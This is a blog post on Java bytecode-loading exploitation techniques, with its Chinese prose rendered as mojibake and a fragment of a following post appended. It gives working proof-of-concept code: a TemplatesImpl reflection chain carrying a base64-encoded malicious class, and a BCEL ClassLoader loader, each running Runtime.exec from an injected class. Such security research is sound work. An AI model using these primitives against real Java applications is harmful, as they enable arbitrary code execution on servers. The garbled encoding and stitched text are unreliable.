11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 å¯¹äºç¬¬ä¸‰ä¸ªï¼š ï¼ˆ1ï¼‰åœ¨newTransformer()æ–¹æ³•ä¸­ï¼š TransformerImpl transformer; transformer = new TransformerImpl(getTransletInstance(), _outputProperties, _indentNumber, _tfactory);//è¿›å…¥ä¸‹ä¸€ä¸ªæ–¹æ³•å¹¶ä¸éœ€è¦æ¡ä»¶ç»§ç»­ï¼Œè¿™é‡Œå°±ç›´æ¥è¯¶è°ƒç”¨get ï¼ˆ2ï¼‰åœ¨ getTransletInstance()æ–¹æ³•ä¸­ï¼š if (_name == null) return null; if (_class == null) defineTransletClasses(); //è¿™é‡Œè¦æ±‚_nameä¸èƒ½ä¸ºnullï¼Œ_classéœ€è¦ä¸ºnullç„¶åç»§ç»­è·Ÿè¿› ï¼ˆ3ï¼‰åœ¨ defineTransletClasses() æ–¹æ³•ä¸­ if (_bytecodes == null) { ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR); throw new TransformerConfigurationException(err.toString()); }//_bytecodesä¸èƒ½ä¸ºnull TransletClassLoader loader = (TransletClassLoader) AccessController.doPrivileged(new PrivilegedAction() { public Object run() { return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());//_tfactoryéœ€è¦èµ‹å€¼ä¸ºTransformerFactoryImplå¯¹è±¡ } }); try { final int classCount = _bytecodes.length; _class = new Class[classCount]; if (classCount \u0026gt; 1) { _auxClasses = new HashMap\u0026lt;\u0026gt;(); } for (int i = 0; i \u0026lt; classCount; i++) { _class[i] = loader.defineClass(_bytecodes[i]); //åœ¨è¿™é‡Œè°ƒç”¨äº†defineClassæ–¹æ³• final Class superClass = _class[i].getSuperclass(); // Check if this is the main class if (superClass.getName().equals(ABSTRACT_TRANSLET)) { _transletIndex = i; } else { _auxClasses.put(_class[i].getName(), _class[i]); } } if (_transletIndex \u0026lt; 0) { ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name); throw new TransformerConfigurationException(err.toString()); } } ç°åœ¨æ¥æ€»ç»“ä¸€ä¸‹ä¸Šé¢é‡åˆ°çš„å˜é‡\n1 2 3 4 private String _name = null; private Class[] _class = null; private byte[][] _bytecodes = null; private transient TransformerFactoryImpl _tfactory = null; è¿™é‡Œå¯ä»¥çœ‹åˆ°è¿™äº›å˜é‡éƒ½æ˜¯ç§æœ‰ç±»ï¼Œè€Œä¸”æ²¡æœ‰æ„é€ æ–¹æ³•ï¼Œæ‰€ä»¥åªèƒ½ç”¨åå°„è·å–æ”¹å€¼ã€‚æ‰€ä»¥æœ€ç»ˆå¯ä»¥è¿™æ ·æ„é€ :\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 package java_foundation; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.Base64; public class Main { public static void main(String[] args) throws Exception { byte[] bytecodes = Base64.getDecoder().decode(\u0026#34;xxxx\u0026#34;); TemplatesImpl mpl =new TemplatesImpl(); setFieldValue(mpl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(mpl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{bytecodes}); setFieldValue(mpl,\u0026#34;_class\u0026#34;,null); setFieldValue(mpl,\u0026#34;_tfactory\u0026#34;,new TransformerFactoryImpl()); mpl.newTransformer(); } public static void setFieldValue(Object mpl,String name,Object value) throws Exception { Field field = mpl.getClass().getDeclaredField(name); field.setAccessible(true); field.set(mpl,value); } } ä½†æ˜¯ç°åœ¨åˆé‡åˆ°ä¸€ä¸ªé—®é¢˜ï¼Œå°±ç®—æˆåŠŸåŠ è½½äº†Classå¯¹è±¡ï¼Œè¿™é‡Œå¹¶ä¸èƒ½ç›´æ¥è°ƒç”¨æ„é€ å‡½æ•°ï¼Œå³æ²¡æœ‰åˆå§‹åŒ–ï¼Œè¿™æ ·å¹¶ä¸èƒ½åˆ©ç”¨æˆ‘ä»¬è‡ªå·±æ„é€ çš„ä»£ç ï¼Œé‚£ä¹ˆè¯¥å¦‚ä½•è§£å†³ï¼Œç»§ç»­çœ‹ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 private Translet getTransletInstance() throws TransformerConfigurationException { try { if (_name == null) return null; if (_class == null) defineTransletClasses(); // The translet needs to keep a reference to all its auxiliary // class to prevent the GC from collecting them AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance(); translet.postInitialization(); translet.setTemplates(this); translet.setServicesMechnism(_useServicesMechanism); translet.setAllowedProtocols(_accessExternalStylesheet); if (_auxClasses != null) { translet.setAuxiliaryClasses(_auxClasses); } return translet; } å¯ä»¥çœ‹åˆ°ä»£ç ååŠéƒ¨åˆ†å®ä¾‹åŒ–äº†ä¸€ä¸ªå¯¹è±¡ç»™transletï¼Œå¹¶ä¸”æœ€åè¿”å›çš„ä¹Ÿæ˜¯transletï¼Œæ‰€ä»¥è¿˜æ˜¯è¿™é‡Œçš„newInstance()æœ‰ç”¨ï¼ˆé‡ç‚¹ï¼Œå°±æ˜¯åˆ©ç”¨è¿™ä¸ªæ„é€ æ–¹æ³•æ¥å®ä¾‹åŒ–å¯¹è±¡æ—¶æ¥åˆ©ç”¨ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆå°†æ¶æ„ä»£ç è®¾ç½®åœ¨æ„é€ æ–¹æ³•ä¸­ï¼‰ï¼Œæ‰€ä»¥è¦ç¡®ä¿è¿›å…¥defineTransletClasses()å¹¶ä¸ä¼šæŠ¥é”™ï¼Œç°åœ¨ç»§ç»­æ¥çœ‹defineTransletClasses()æ–¹æ³•\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 private void defineTransletClasses() throws TransformerConfigurationException { if (_bytecodes == null) { ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR); throw new TransformerConfigurationException(err.toString()); } TransletClassLoader loader = (TransletClassLoader) AccessController.doPrivileged(new PrivilegedAction() { public Object run() { return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap()); } }); try { final int classCount = _bytecodes.length; _class = new Class[classCount]; if (classCount \u0026gt; 1) { _auxClasses = new HashMap\u0026lt;\u0026gt;(); } for (int i = 0; i \u0026lt; classCount; i++) { _class[i] = loader.defineClass(_bytecodes[i]); final Class superClass = _class[i].getSuperclass(); // Check if this is the main class if (superClass.getName().equals(ABSTRACT_TRANSLET)) { _transletIndex = i; } else { _auxClasses.put(_class[i].getName(), _class[i]); } } if (_transletIndex \u0026lt; 0) {//è¿™é‡Œè¦æ±‚_transletIndexä¸èƒ½å°äº0 ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name); throw new TransformerConfigurationException(err.toString()); } } åœ¨è¿™ä¸ªä»£ç ä¸­ï¼Œè™½ç„¶æˆ‘ä»¬åœ¨å‰é¢ä¸ºäº†ç¬¦åˆæ¡ä»¶å°†_classèµ‹å€¼ä¸ºäº†nullï¼Œä½†æ˜¯åœ¨defineTransletClasses()æ–¹æ³•ä¸­é‡æ–°å¯¹è¿™ä¸ª_classèµ‹å€¼äº†ï¼š\nè¿™é‡Œä¸å¤šè¯´ã€‚åé¢å°±æ‡‚äº†ã€‚ç„¶åçœ‹ä¸‹é¢è¿™éƒ¨åˆ†ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 // Check if this is the main class if (superClass.getName().equals(ABSTRACT_TRANSLET)) { _transletIndex = i; } else { _auxClasses.put(_class[i].getName(), _class[i]); } } if (_transletIndex \u0026lt; 0) {//è¿™é‡Œè¦æ±‚_transletIndexä¸èƒ½å°äº0 ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name); throw new TransformerConfigurationException(err.toString()); } } è¿™é‡Œ_transletIndexä¸èƒ½å°äº0ï¼Œå¹¶ä¸”åœ¨å‰é¢å¯ä»¥çœ‹åˆ°èµ‹å€¼è¯­å¥ï¼š\n1 _transletIndex = i; è¿™é‡Œåˆšå¥½ä¸å‰é¢çš„_class[_transletIndex]ç›¸å¯¹åº”ï¼Œå¹¶ä¸”ä»€ä¹ˆï¼Œå‰é¢çš„ä»£ç é€»è¾‘ä¹Ÿå®Œå…¨ç¬¦åˆï¼Œå¦‚ä¸‹ï¼š\nä¹Ÿå°±æ˜¯è¯´å…ˆè°ƒç”¨äº†defineTransletClasses()æ–¹æ³•ï¼Œè®©_classä¸å†ä¸ºnullï¼Œæ‰€ä»¥å¯ä»¥æœ‰å€¼ã€‚\nä¹Ÿå°±æ˜¯å¯ä»¥ç†è§£ä¸ºåªè¦æ¡ä»¶æ»¡è¶³ï¼Œ_bytecodeså¯¹åº”çš„ä»£ç éƒ½ä¼šä¼ ç»™_class[i]ï¼Œä¹Ÿå°±æ˜¯_class[_transletIndex],ç„¶åå°±ä¼šå†å¯¹è¿™ä¸ªç±»è¿›è¡Œå®ä¾‹åŒ–ï¼Œè¿™æ ·å°±å¯ä»¥æˆåŠŸè¿è¡Œã€‚ç°åœ¨æ¥çœ‹ç»™è¿™ä¸ªèµ‹å€¼çš„ifçš„æ¡ä»¶è¯­å¥ï¼Œå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 if (superClass.getName().equals(ABSTRACT_TRANSLET)) { _transletIndex = i; } å†çœ‹ _class[i] = loader.defineClass(_bytecodes[i]); final Class superClass = _class[i].getSuperclass(); æ‰€ä»¥è¿™é‡Œå°±éœ€è¦_bytecodes[i]çš„çˆ¶ç±»éœ€è¦ä¸ºAbstractTransletæ‰è¡Œ\n1 2 private static String ABSTRACT_TRANSLET = \u0026#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet\u0026#34;; æ‰€ä»¥ä½¿ç”¨çš„POC:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import java.io.IOException; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; public class Test extends AbstractTranslet { public Test() throws IOException { Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } è¿™é‡Œä¸ºä»€ä¹ˆè¦å¤šä¸¤ä¸ªtransformæ–¹æ³•ï¼ŒåŸå› å¦‚ä¸‹;\n1 2 3 4 5 è¿™é‡Œæ˜¯å› ä¸ºå­ç±»éœ€è¦å®ç°çˆ¶ç±»é‡Œé¢çš„æŠ½è±¡æ–¹æ³•ï¼ŒåŒæ—¶å› ä¸ºçˆ¶ç±»æ˜¯æŠ½è±¡ç±»ï¼Œå¯èƒ½æ²¡æœ‰å°†æ¥å£çš„æ–¹æ³•å…¨éƒ¨å®ç°ï¼Œ è¿™æ—¶å­ç±»å¦‚æœä¸æ˜¯æŠ½è±¡çš„ï¼Œé‚£å¿…é¡»å°†å…¶ä»–æ¥å£æ–¹æ³•éƒ½å®ç°ã€‚ è¿™é‡Œé¢ transform(DOM document, DTMAxisIterator iterator,SerializationHandler handler) æ˜¯çˆ¶ç±»é‡Œé¢çš„æŠ½è±¡æ–¹æ³•æ‰€ä»¥è¦é‡å†™ transform(DOM document, SerializationHandler[] handlers)æ˜¯çˆ¶ç±»æ²¡æœ‰å®ç°æ¥å£çš„æ–¹æ³•æ‰€ä»¥è¦é‡å†™ æœ€ç»ˆçš„POCï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 package java_foundation; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.Base64; public class Main { public static void main(String[] args) throws Exception { byte[] bytecodes = Base64.getDecoder().decode(\u0026#34;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAWTGphdmFfZm91bmRhdGlvbi9UZXh0OwEACkV4Y2VwdGlvbnMHACUBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwAmAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAJVGV4dC5qYXZhDAAHAAgHACcMACgAKQEABGNhbGMMACoAKwEAFGphdmFfZm91bmRhdGlvbi9UZXh0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgAKAAAADgADAAAACgAEAAsADQAMAAsAAAAMAAEAAAAOAAwADQAAAA4AAAAEAAEADwABABAAEQACAAkAAAA/AAAAAwAAAAGxAAAAAgAKAAAABgABAAAADwALAAAAIAADAAAAAQAMAA0AAAAAAAEAEgATAAEAAAABABQAFQACAA4AAAAEAAEAFgABABAAFwACAAkAAABJAAAABAAAAAGxAAAAAgAKAAAABgABAAAAEgALAAAAKgAEAAAAAQAMAA0AAAAAAAEAEgATAAEAAAABABgAGQACAAAAAQAaABsAAwAOAAAABAABABYAAQAcAAAAAgAd\u0026#34;); TemplatesImpl mpl =new TemplatesImpl(); setFieldValue(mpl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(mpl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{bytecodes}); setFieldValue(mpl,\u0026#34;_class\u0026#34;,null); setFieldValue(mpl,\u0026#34;_tfactory\u0026#34;,new TransformerFactoryImpl()); mpl.newTransformer(); } public static void setFieldValue(Object mpl,String name,Object value) throws Exception { Field field = mpl.getClass().getDeclaredField(name); field.setAccessible(true); field.set(mpl,value); } } è™½ç„¶æŠ¥é”™ï¼Œä½†æ˜¯æˆåŠŸå¼¹å‡ºè®¡ç®—æœºï¼š\næŠ¥é”™æ˜¯æ­£å¸¸çš„ï¼Œå› ä¸ºæœ¬æ¥æ„é€ å‡ºæ¥çš„åŠ¨æ€åŠ è½½å­—èŠ‚ç å°±ä¼šå¯¼è‡´åŸæœ‰é€»è¾‘è¢«ç ´åï¼Œæ‰€ä»¥æ˜¯è‚¯å®šä¼šæŠ¥é”™çš„ã€‚ä½†è¾¾åˆ°äº†æœ€ç»ˆç›®çš„ã€‚\né‚£ä¹ˆç°åœ¨æˆ‘ä»¬æ¥å°è¯•ä¸€ä¸‹åˆ©ç”¨é‚£ä¸ªpublicä¿®é¥°ç¬¦çš„æ–¹æ³•ï¼Œå³getTransletIndexï¼Œä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 public synchronized int getTransletIndex() { try { if (_class == null) defineTransletClasses(); } catch (TransformerConfigurationException e) { // Falls through } return _transletIndex; } è¿™é‡Œä¹Ÿæ˜¯åªéœ€è¦_classå˜é‡ä¸ºnullå³å¯ï¼Œç°åœ¨å°±ç»§ç»­è·ŸdefineTransletClasses()ï¼Œä½†æ˜¯è¿™é‡Œå°±æœ‰ä¸ªé—®é¢˜ï¼Œæ— æ³•å®ä¾‹åŒ–ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆæ²¡æœ‰åˆ©ç”¨åˆ°è¿™ä¸ªçš„åŸå› ã€‚\nç»§ç»­æ€è€ƒï¼Œæ˜¯ç§æœ‰æ–¹æ³•ï¼Œä¸ºä»€ä¹ˆä¸ç›´æ¥ä½¿ç”¨åå°„æ¥è·å–ï¼Œå› ä¸ºTemplatesImplç±»æœ‰ä¸€ä¸ªæ— å‚çš„å…¬å…±çš„æ„é€ æ–¹æ³•ï¼Œå°è¯•æ„é€ ä¸€ä¸‹\nå¼¹è®¡ç®—æœºä»£ç ä¸å˜ï¼Œå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package java_foundation; import java.io.IOException; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; public class Text extends AbstractTranslet { public Text() throws IOException { Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } Main.javaå˜ä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 //å¯¹è±¡+getClass() package java_foundation; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.lang.reflect.Method; import java.nio.file.Files; import java.nio.file.Paths; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\java_foundation\\\\Text.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); Method method = ctf.getClass().getDeclaredMethod(\u0026#34;getTransletInstance\u0026#34;); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); method.setAccessible(true); method.invoke(ctf);//ä½†æ˜¯å…¶å®åœ¨æ ¹æœ¬ä¸Šæ²¡æœ‰å˜åŒ–ï¼Œéƒ½æ˜¯åœ¨getTransletInstanceæ–¹æ³•è¿™é‡Œå®ä¾‹åŒ–ï¼Œæ²¡åŠæ³•ï¼Œåªæœ‰è¿™é‡Œæ¥æ”¶åˆ°äº†defineClass()è¿”å›çš„ç±»ï¼Œè¿™é‡Œæ‰èƒ½å®ä¾‹åŒ– } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } å…¶ä»–å°±ä¸å¤šè¯´äº†ã€‚\nåˆ©ç”¨BCEL ClassLoaderåŠ è½½å­—èŠ‚ç  å…³äºBCELå¯ä»¥å…ˆçœ‹çœ‹Pç¥çš„æ–‡ç« ï¼šhttps://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html#0x01-bcel\nåœ¨Java 8u251çš„æ›´æ–°ä¸­ï¼Œè¿™ä¸ªClassLoaderè¢«ç§»é™¤äº†ï¼Œç®€å•äº†è§£ä¸€ä¸‹ã€‚è¿™é‡Œç”¨JDK7çœ‹ä¸€ä¸‹\nâ€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”\nBCELå…¨åæ˜¯Apache Commoms BCELï¼Œå±äºApache Commomsé¡¹ç›®ä¸‹çš„ä¸€ä¸ªå­é¡¹ç›®ã€‚\nBCELåº“æä¾›äº†ä¸€ç³»åˆ—ç”¨äºåˆ†æã€åˆ›å»ºã€ä¿®æ”¹Java Classæ–‡ä»¶çš„APIã€‚å®ƒå¾ˆç‰¹æ®Šçš„ç‚¹åœ¨å®ƒè¢«åŒ…å«åœ¨äº†åŸç”Ÿçš„JDKä¸­ï¼Œä½äºcom.sun.org.apache.bcelä¸­ã€‚\nBCELåŒ…ä¸­æœ‰ä¸ªæœ‰è¶£çš„ç±»com.sun.org.apache.bcel.internal.util.ClassLoaderï¼Œä»–æ˜¯ä¸€ä¸ªClassLoaderï¼Œä½†æ˜¯ä»–é‡å†™äº†Javaå†…ç½®çš„ClassLoader#loadClass()æ–¹æ³•ï¼Œå»çœ‹ä¸€ä¸‹æºç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 protected Class loadClass(String class_name, boolean resolve) throws ClassNotFoundException { Class cl = null; /* First try: lookup hash table. */ if((cl=(Class)classes.get(class_name)) == null) { /* Second try: Load system class using system class loader. You better * don\u0026#39;t mess around with them. */ for(int i=0; i \u0026lt; ignored_packages.length; i++) { if(class_name.startsWith(ignored_packages[i])) { cl = deferTo.loadClass(class_name); break; } } if(cl == null) { JavaClass clazz = null; /* Third try: Special request? */ if(class_name.indexOf(\u0026#34;$$BCEL$$\u0026#34;) \u0026gt;= 0) clazz = createClass(class_name); else { // Fourth try: Load classes via repository if ((clazz = repository.loadClass(class_name)) != null) { clazz = modifyClass(clazz); } else throw new ClassNotFoundException(class_name); } if(clazz != null) { byte[] bytes = clazz.getBytes(); cl = defineClass(class_name, bytes, 0, bytes.length);//è¿™é‡Œè°ƒç”¨äº†defineClassæ–¹æ³• } else // Fourth try: Use default class loader cl = Class.forName(class_name); } if(resolve) resolveClass(cl); } classes.put(class_name, cl); return cl; } å…¶ä¸­è°ƒç”¨çš„æ˜¯defineClass()æ–¹æ³•\n1 2 3 4 if(clazz != null) { byte[] bytes = clazz.getBytes(); cl = defineClass(class_name, bytes, 0, bytes.length);//è¿™é‡Œè°ƒç”¨äº†defineClassæ–¹æ³• } çœ‹ä»£ç ï¼Œè¿™é‡Œå°±éœ€è¦éœ€è¦BCELå­—èŠ‚ç çš„å¼€å¤´ä¸º$$BCEL$$ï¼Œç”¨createClassæ–¹æ³•è·å–ç±»çš„Classå¯¹è±¡ä»è€Œå¯ä»¥èµ‹å€¼ç»™clazzã€‚\n1 2 if(class_name.indexOf(\u0026#34;$$BCEL$$\u0026#34;) \u0026gt;= 0) clazz = createClass(class_name); ç®€å•æ¢³ç†ä¸€ä¸‹è¿‡ç¨‹ï¼Œé¦–å…ˆå°±æ˜¯è®¾ç½®clä¸ºnull\nç„¶ååœ¨ä¸‹é¢è¿™ä¸ªæ¡ä»¶è¯­å¥åˆ¤æ–­å¼€å¤´æœ‰æ²¡æœ‰è¿™ä¸ªä¸œè¥¿ï¼Œå¦‚æœæœ‰ï¼Œå°±ä½¿ç”¨createClass()æ–¹æ³•æ¥å¯¹è±¡å¹¶èµ‹å€¼ç»™clazzï¼Œå…·ä½“å®ç°å¯ä»¥è‡ªå·±å»çœ‹æºä»£ç ï¼ˆåœ¨createClassæ–¹æ³•å†…å°±å·²ç»å°†BCELå½¢å¼çš„å­—èŠ‚ç è½¬æ¢æˆJavaClasså¯¹è±¡äº†ï¼‰\næ­¤æ—¶clazzä¸ä¸ºnullï¼Œé‚£ä¹ˆå°±ä¼šè¿›å…¥åˆ°ä¸‹é¢è¿™ä¸ªè¯­å¥\nè¿™é‡Œå°±ä¼šè°ƒç”¨åˆ°defeineClass()æ–¹æ³•äº†ï¼Œå†åœ¨è¿™é‡Œé¢å¾—åˆ°ç±»çš„Classå­—èŠ‚ç ï¼Œæœ€ç»ˆè·å¾—ç±»å¯¹è±¡clå¹¶returnäº†å›å»ã€‚\næµç¨‹å·²ç»åŸºæœ¬æ¸…æ¥šï¼Œé‚£ä¹ˆå¦‚ä½•åˆ©ç”¨å‘¢ï¼Œå¦‚ä¸‹ï¼š\nåœ¨BCELä¸­ï¼Œå®ƒæä¾›äº†Utilityå’ŒRepositoryç±»\nå…¶ä¸­Repositoryæä¾›äº†lookupClassæ–¹æ³•ç”¨äºåŠ è½½ä¸€ä¸ªç±»\nUtilityç±»æä¾›äº†ä¸€ä¸ªencodeæ–¹æ³•ç”¨äºå°†JavaClasså¯¹è±¡è½¬æ¢æˆBCELå½¢å¼çš„å­—èŠ‚ç \n1 String code = Utility.encode(clazz.getBytes(), true); å†ç”¨BCEL ClassLoaderè¿›è¡ŒåŠ è½½\n1 new ClassLoader().loadClass(\u0026#34;$$BCEL$$\u0026#34; + code).newInstance();//è¿™é‡Œå°±æ˜¯ç®€å•çš„å®ä¾‹åŒ–å¯¹è±¡åçš„å¯¹ä¸€ä¸ªå‡½æ•°çš„è°ƒç”¨ æ•´åˆä¸€ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·åˆ©ç”¨\nç¼–å†™æ¶æ„ç±»ï¼š\n1 2 3 4 5 6 //Test.java public class Test{ static { Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); } } POCï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 import com.sun.org.apache.bcel.internal.Repository; import com.sun.org.apache.bcel.internal.classfile.JavaClass; import com.sun.org.apache.bcel.internal.classfile.Utility; import com.sun.org.apache.bcel.internal.util.ClassLoader; public class Main { public static void main(String[] args) throws Exception { JavaClass clazz = Repository.lookupClass(Test.class); String code = Utility.encode(clazz.getBytes(), true); System.out.println(code); new ClassLoader().loadClass(\u0026#34;$$BCEL$$\u0026#34; + code).newInstance(); } } æˆåŠŸå¼¹å‡ºè®¡ç®—æœºï¼š\nä»£ç ä¸ºä»€ä¹ˆè¦è¿™æ ·æ„é€ å…¶å®å·²ç»æ¯”è¾ƒæ¸…æ¥šäº†ï¼Œå¯ä»¥è‡ªå·±æƒ³æƒ³æµç¨‹æ¥å¯¹æ¯”ä¸€ä¸‹ã€‚\nè¿˜æœ‰çš„å°±æ˜¯è¿™é‡ŒJDK7è¿è¡Œéœ€è¦æ”¹ideaçš„é…ç½®ï¼Œä¸ºäº†èƒ½æµ‹è¯•æˆåŠŸæ”¹äº†ï¼Œä½†æ˜¯åé¢åˆæ”¹å›æ¥äº†ï¼Œåˆšå¥½é˜²æ­¢è‡ªå·±å¿˜ï¼Œå¯ä»¥å‚è€ƒæ–‡ç« æ¥æ”¹ï¼šhttps://blog.csdn.net/weixin_46001244/article/details/108601584\n","date":"2025-01-22T13:00:13+08:00","permalink":"https://fupanc-w1n.github.io/p/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/","title":"åŠ¨æ€åŠ è½½å­—èŠ‚ç "},{"content":"JavaåŠ¨æ€ä»£ç† åˆ©ç”¨äº†ä»£ç†æ¨¡å¼ï¼Œä¸€ä¸ªé€šä¿—æ˜“æ‡‚çš„è¯´æ³•ï¼šç»™æŸä¸€ä¸ªå¯¹è±¡æä¾›ä¸€ä¸ªä»£ç†ï¼Œå¹¶ç”±ä»£ç†å¯¹è±¡æ¥æ§åˆ¶å¯¹çœŸå®å¯¹è±¡çš„è®¿é—®ã€‚\nç®€å•è¯´æ˜ ä»£ç†æ¨¡å¼æ˜¯Javaä¸­å¸¸è§çš„è®¾è®¡æ¨¡å¼ã€‚\nå…¶ç‰¹å¾æ˜¯ä»£ç†ç±»å’Œå§”æ‰˜ç±»æœ‰åŒæ 